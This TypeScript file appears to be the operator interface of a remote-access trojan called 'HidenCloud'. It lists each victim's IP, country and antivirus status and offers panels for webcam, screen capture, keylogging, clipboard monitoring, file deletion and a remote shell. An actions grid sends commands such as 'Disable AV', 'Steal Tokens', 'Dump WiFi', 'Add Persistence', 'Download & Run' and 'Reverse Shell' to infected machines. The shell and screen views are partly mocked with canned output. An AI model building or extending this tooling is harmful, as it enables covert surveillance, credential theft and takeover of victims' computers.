import type { ClientDetailResponse } from "./types.js";
import { api } from "./api.js";

type Panel = "screen" | "camera" | "files" | "shell" | "keylogger" | "clipboard" | "processes" | "actions";

export function renderAdminControl(detail: ClientDetailResponse): string {
  const c = detail.client;
  return `
    <div class="ac-header">
      <button class="logout" id="ac-back">← Back to clients</button>
      <div class="ac-title">
        <h1>Admin Control</h1>
        <p class="page-sub">
          Connected to <strong>${c.name}</strong>
          <span class="badge online"><i class="pulse"></i>${c.status}</span>
        </p>
      </div>
    </div>

    <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(140px,1fr))">
      <div class="card mini-card"><div class="label">Client ID</div><div class="value sm">${c.id}</div></div>
      <div class="card mini-card"><div class="label">User</div><div class="value sm">${c.user}</div></div>
      <div class="card mini-card"><div class="label">OS</div><div class="value sm">${c.os}</div></div>
      <div class="card mini-card"><div class="label">IP</div><div class="value sm">${c.ip}</div></div>
      <div class="card mini-card"><div class="label">CPU</div><div class="value sm">${c.cpu}</div></div>
      <div class="card mini-card"><div class="label">RAM</div><div class="value sm">${c.ram}</div></div>
      <div class="card mini-card"><div class="label">GPU</div><div class="value sm">${c.gpu}</div></div>
      <div class="card mini-card"><div class="label">Uptime</div><div class="value sm">${c.uptime}</div></div>
      <div class="card mini-card"><div class="label">Country</div><div class="value sm">${c.country}</div></div>
      <div class="card mini-card"><div class="label">AV</div><div class="value sm av-${c.av === "None" ? "none" : "active"}">${c.av}</div></div>
      <div class="card mini-card"><div class="label">Network</div><div class="value sm">${c.netSpeed}</div></div>
      <div class="card mini-card"><div class="label">Installed</div><div class="value sm">${c.installed}</div></div>
    </div>

    <div class="ac-tabs" role="tablist">
      <button class="ac-tab active" data-panel="screen">🖥️ Screen</button>
      <button class="ac-tab" data-panel="camera">📷 Camera</button>
      <button class="ac-tab" data-panel="files">📁 Files</button>
      <button class="ac-tab" data-panel="shell">💻 Shell</button>
      <button class="ac-tab" data-panel="keylogger">⌨️ Keylogger</button>
      <button class="ac-tab" data-panel="clipboard">📋 Clipboard</button>
      <button class="ac-tab" data-panel="processes">⚙️ Processes</button>
      <button class="ac-tab" data-panel="actions">🎯 Actions</button>
    </div>

    <div id="ac-panel"></div>
  `;
}

export function bindAdminControl(
  root: HTMLElement,
  detail: ClientDetailResponse,
  onBack: () => void,
): void {
  root.querySelector<HTMLButtonElement>("#ac-back")!.addEventListener("click", onBack);

  const panelEl = root.querySelector<HTMLElement>("#ac-panel")!;
  const tabs = root.querySelectorAll<HTMLButtonElement>(".ac-tab");
  let current: Panel = "screen";

  const setPanel = (p: Panel) => {
    current = p;
    tabs.forEach((t) => t.classList.toggle("active", t.dataset["panel"] === p));
    panelEl.innerHTML = renderPanel(p, detail);
    if (p === "shell") bindShell(panelEl);
    if (p === "screen") tickScreen(panelEl);
    if (p === "actions") bindActions(panelEl, detail);
  };

  tabs.forEach((t) =>
    t.addEventListener("click", () => setPanel(t.dataset["panel"] as Panel)),
  );
  setPanel("screen");
}

function renderPanel(p: Panel, detail: ClientDetailResponse): string {
  if (p === "screen") {
    return `
      <div class="card viewer">
        <div class="viewer-toolbar">
          <button class="logout" id="refresh-screen">🔄 Refresh</button>
          <button class="logout">📸 Save Screenshot</button>
          <button class="logout">🎥 Start Recording</button>
          <span class="muted" id="screen-ts">Capturing…</span>
        </div>
        <div class="viewer-frame" id="screen-frame">
          <div class="scanlines"></div>
          <div class="viewer-desktop">
            <div class="fake-taskbar">
              <span class="fake-start">■</span>
              <span class="fake-clock" id="screen-clock"></span>
            </div>
            <div class="fake-window">
              <div class="fake-title">C:\\Users\\${detail.client.user}\\Documents</div>
              <div class="fake-body">
                <p>📄 report.docx</p>
                <p>📊 budget.xlsx</p>
                <p>🔑 passwords.txt</p>
                <p>💰 wallet.dat</p>
              </div>
            </div>
          </div>
        </div>
        <div class="viewer-info">
          <span class="muted">Resolution: 1920×1080</span>
          <span class="muted">FPS: ~2</span>
          <span class="muted">Quality: High</span>
        </div>
      </div>`;
  }

  if (p === "camera") {
    return `
      <div class="card viewer">
        <div class="viewer-toolbar">
          <button class="logout">● Record</button>
          <button class="logout">📸 Snapshot</button>
          <select class="cam-select">
            <option>Front Camera (HD 720p)</option>
            <option>Rear Camera</option>
            <option>External USB</option>
          </select>
          <span class="muted">Webcam: HD 720p</span>
        </div>
        <div class="viewer-frame camera">
          <div class="cam-noise"></div>
          <div class="cam-overlay">
            <span class="rec"><i></i> LIVE</span>
            <span class="muted">${detail.client.name} · front camera</span>
          </div>
        </div>
      </div>`;
  }

  if (p === "files") {
    const rows = detail.files
      .map(
        (f) => `
          <tr>
            <td>${f.type === "folder" ? "📁" : "📄"} ${f.name}</td>
            <td>${f.type}</td>
            <td>${f.size}</td>
            <td>${f.modified}</td>
            <td class="file-actions">
              ${f.type === "file" ? '<button class="logout">⬇️ Download</button>' : ""}
              <button class="logout">🗑️ Delete</button>
              ${f.type === "folder" ? '<button class="logout">📂 Open</button>' : ""}
            </td>
          </tr>`,
      )
      .join("");
    return `
      <div class="card">
        <div class="viewer-toolbar">
          <span class="muted">📂 Path: C:\\Users\\${detail.client.user}</span>
          <button class="logout">⬆️ Upload</button>
          <button class="logout">📁 New Folder</button>
          <button class="logout">🔄 Refresh</button>
        </div>
        <table>
          <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;
  }

  if (p === "keylogger") {
    const rows = detail.keylogs
      .map(
        (k) => `
        <tr>
          <td class="muted">${k.ts}</td>
          <td><span class="group-tag">${k.window}</span></td>
          <td><code>${escapeHtml(k.text)}</code></td>
        </tr>`,
      )
      .join("");
    return `
      <div class="card">
        <div class="viewer-toolbar">
          <span class="muted">⌨️ Live keylog buffer — ${detail.client.name}</span>
          <button class="logout">🔄 Refresh</button>
          <button class="logout">📥 Export</button>
          <button class="logout danger-btn">🗑️ Clear</button>
        </div>
        <table>
          <thead><tr><th>Time</th><th>Window</th><th>Captured Text</th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;
  }

  if (p === "clipboard") {
    const rows = detail.clipboard
      .map(
        (c) => `
        <tr>
          <td class="muted">${c.ts}</td>
          <td><code class="clip-content">${escapeHtml(c.content)}</code></td>
          <td><button class="logout copy-clip" data-text="${escapeAttr(c.content)}">📋 Copy</button></td>
        </tr>`,
      )
      .join("");
    return `
      <div class="card">
        <div class="viewer-toolbar">
          <span class="muted">📋 Clipboard monitor — ${detail.client.name}</span>
          <button class="logout">🔄 Refresh</button>
          <button class="logout">📥 Export</button>
        </div>
        <table>
          <thead><tr><th>Time</th><th>Content</th><th></th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;
  }

  if (p === "processes") {
    const rows = detail.processes
      .map(
        (pr) => `
        <tr>
          <td class="muted">${pr.pid}</td>
          <td><strong>${pr.name}</strong></td>
          <td>${pr.cpu}</td>
          <td>${pr.mem}</td>
          <td><span class="badge ${pr.status === "running" ? "online" : "idle"}">${pr.status}</span></td>
          <td>
            <button class="logout danger-btn kill-proc" data-name="${pr.name}">Kill</button>
            <button class="logout suspend-proc" data-name="${pr.name}">${pr.status === "suspended" ? "Resume" : "Suspend"}</button>
          </td>
        </tr>`,
      )
      .join("");
    return `
      <div class="card">
        <div class="viewer-toolbar">
          <span class="muted">⚙️ Process Manager — ${detail.client.name}</span>
          <button class="logout">🔄 Refresh</button>
          <input type="text" id="proc-search" placeholder="Filter processes..." style="width:200px;margin:0" />
        </div>
        <table>
          <thead><tr><th>PID</th><th>Name</th><th>CPU</th><th>Memory</th><th>Status</th><th>Actions</th></tr></thead>
          <tbody id="proc-tbody">${rows}</tbody>
        </table>
      </div>`;
  }

  if (p === "actions") {
    return `
      <div class="card">
        <h2 style="margin-top:0">🎯 Remote Actions — ${detail.client.name}</h2>
        <p class="muted">Execute commands on the remote machine.</p>
        <div class="actions-grid">
          <button class="action-card" data-action="screenshot"><span class="action-icon">📸</span><span>Screenshot</span></button>
          <button class="action-card" data-action="lock"><span class="action-icon">🔒</span><span>Lock Screen</span></button>
          <button class="action-card" data-action="shutdown"><span class="action-icon">⛔</span><span>Shutdown</span></button>
          <button class="action-card" data-action="restart"><span class="action-icon">🔄</span><span>Restart</span></button>
          <button class="action-card" data-action="bsod"><span class="action-icon">💀</span><span>BSOD</span></button>
          <button class="action-card" data-action="msgbox"><span class="action-icon">💬</span><span>Message Box</span></button>
          <button class="action-card" data-action="openurl"><span class="action-icon">🌐</span><span>Open URL</span></button>
          <button class="action-card" data-action="wallpaper"><span class="action-icon">🖼️</span><span>Change Wallpaper</span></button>
          <button class="action-card" data-action="elevate"><span class="action-icon">⬆️</span><span>Elevate (UAC)</span></button>
          <button class="action-card" data-action="persist"><span class="action-icon">📌</span><span>Add Persistence</span></button>
          <button class="action-card" data-action="keylog-start"><span class="action-icon">⌨️</span><span>Start Keylogger</span></button>
          <button class="action-card" data-action="download"><span class="action-icon">📥</span><span>Download & Run</span></button>
          <button class="action-card" data-action="disable-av"><span class="action-icon">🛡️</span><span>Disable AV</span></button>
          <button class="action-card" data-action="steal-tokens"><span class="action-icon">🎫</span><span>Steal Tokens</span></button>
          <button class="action-card" data-action="dump-wifi"><span class="action-icon">📶</span><span>Dump WiFi</span></button>
          <button class="action-card" data-action="reverse-shell"><span class="action-icon">🐚</span><span>Reverse Shell</span></button>
        </div>
        <div id="action-result" class="action-result"></div>
      </div>`;
  }

  // shell
  return `
    <div class="card">
      <div class="shell-out" id="shell-out">HidenCloud remote shell — ${detail.client.name}\nType a command and press enter. Type "help" for available commands.\n</div>
      <form id="shell-form" class="shell-form">
        <span class="prompt">C:\\&gt;</span>
        <input id="shell-in" autocomplete="off" spellcheck="false" />
      </form>
    </div>`;
}

function bindActions(root: HTMLElement, detail: ClientDetailResponse): void {
  const resultEl = root.querySelector<HTMLElement>("#action-result")!;
  root.querySelectorAll<HTMLButtonElement>(".action-card").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const action = btn.dataset["action"] ?? "";
      resultEl.innerHTML = `<div class="action-pending">⏳ Executing "${action}" on ${detail.client.name}...</div>`;
      try {
        const res = await api.sendCommand(detail.client.id, action);
        resultEl.innerHTML = `<div class="action-success">✅ ${res.result}</div>`;
      } catch {
        resultEl.innerHTML = `<div class="action-error">❌ Failed to execute "${action}"</div>`;
      }
    });
  });
}

function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function escapeAttr(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function tickScreen(root: HTMLElement): void {
  const clock = root.querySelector<HTMLElement>("#screen-clock");
  const ts = root.querySelector<HTMLElement>("#screen-ts");
  const update = () => {
    const now = new Date();
    if (clock) clock.textContent = now.toLocaleTimeString();
    if (ts) ts.textContent = `Last frame: ${now.toLocaleTimeString()}`;
  };
  update();
  const int = window.setInterval(update, 1000);
  const obs = new MutationObserver(() => {
    if (!document.body.contains(root)) {
      window.clearInterval(int);
      obs.disconnect();
    }
  });
  obs.observe(document.body, { childList: true, subtree: true });
}

function bindShell(root: HTMLElement): void {
  const out = root.querySelector<HTMLDivElement>("#shell-out")!;
  const form = root.querySelector<HTMLFormElement>("#shell-form")!;
  const input = root.querySelector<HTMLInputElement>("#shell-in")!;
  const history: string[] = [];
  let histIdx = -1;

  input.addEventListener("keydown", (e) => {
    if (e.key === "ArrowUp") {
      e.preventDefault();
      if (histIdx < history.length - 1) histIdx++;
      input.value = history[histIdx] ?? "";
    }
    if (e.key === "ArrowDown") {
      e.preventDefault();
      if (histIdx > 0) histIdx--;
      else histIdx = -1;
      input.value = histIdx >= 0 ? (history[histIdx] ?? "") : "";
    }
  });

  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const cmd = input.value.trim();
    if (!cmd) return;
    history.unshift(cmd);
    histIdx = -1;
    out.textContent += `\nC:\\> ${cmd}\n${fakeShell(cmd)}\n`;
    out.scrollTop = out.scrollHeight;
    input.value = "";
  });
}

function fakeShell(cmd: string): string {
  const c = cmd.toLowerCase();
  if (c === "dir" || c === "ls") return " Desktop  Documents  Downloads  AppData  passwords.txt  wallet.dat";
  if (c === "whoami") return "desktop-jay\\jay";
  if (c.startsWith("echo ")) return cmd.slice(5);
  if (c === "help") return "Commands: dir, whoami, echo, cls, ipconfig, systeminfo, tasklist, netstat, hostname, date, time, ver, tree";
  if (c === "cls") return "";
  if (c === "ipconfig") return "IPv4 Address. . . . . . : 192.168.1.42\nSubnet Mask . . . . . . : 255.255.255.0\nDefault Gateway . . . . : 192.168.1.1\nDNS Servers . . . . . . : 8.8.8.8, 8.8.4.4";
  if (c === "systeminfo") return "OS Name: Microsoft Windows 11 Pro\nOS Version: 10.0.22631\nSystem Type: x64-based PC\nTotal Physical Memory: 32,768 MB\nAvailable Physical Memory: 18,422 MB";
  if (c === "tasklist") return "PID    Name             CPU    Mem\n4      System           0.1%   12 MB\n124    explorer.exe     1.2%   82 MB\n3200   chrome.exe       8.4%   640 MB\n5100   discord.exe      2.1%   310 MB";
  if (c === "netstat") return "TCP  192.168.1.42:49832  142.250.74.14:443  ESTABLISHED\nTCP  192.168.1.42:50112  162.159.136.232:443  ESTABLISHED\nTCP  192.168.1.42:51200  104.26.12.205:443  TIME_WAIT";
  if (c === "hostname") return "DESKTOP-JAY";
  if (c === "date") return new Date().toLocaleDateString();
  if (c === "time") return new Date().toLocaleTimeString();
  if (c === "ver") return "Microsoft Windows [Version 10.0.22631.4169]";
  if (c === "tree") return "C:\\Users\\jay\n├── Desktop\n├── Documents\n│   ├── report.docx\n│   └── budget.xlsx\n├── Downloads\n└── passwords.txt";
  return `'${cmd}' is not recognized as an internal or external command.`;
}
